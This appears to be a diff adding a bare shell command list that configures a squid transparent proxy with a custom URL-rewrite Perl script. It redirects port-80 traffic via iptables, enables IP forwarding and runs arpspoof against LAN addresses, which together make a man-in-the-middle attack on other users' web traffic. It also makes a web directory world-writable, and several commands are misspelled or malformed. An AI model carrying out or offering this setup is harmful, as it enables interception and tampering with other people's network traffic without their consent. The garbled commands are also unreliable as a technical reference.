@@ -1,0 +1,19 @@
+apt-cache search squid3
+apt-get install squid3 -y
+apt-cache search apache
+apt-get install apache2
+apt-get install imagemagick ghostscript jp2a
+nano googleSearch.pl
+chmod +x googleSearch.pl
+nano asciiImages.pl
+nano /etc/squid3.squid.conf
+alc localnet src
+url_rewrite_program /root/googleSearch.pl
+service squid3 restart
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --destinstion-port 80 -j REDIRECT --to-port 3128
+echo 1 > /proc/sys/net/ipv4/ip_forward
+service squid3 restart
+chmod 777 /var/www/tmp
+service apache2 restart 
+arspoof -i eth0 -t 192.168.0.1 -r 192.168.0.101
+
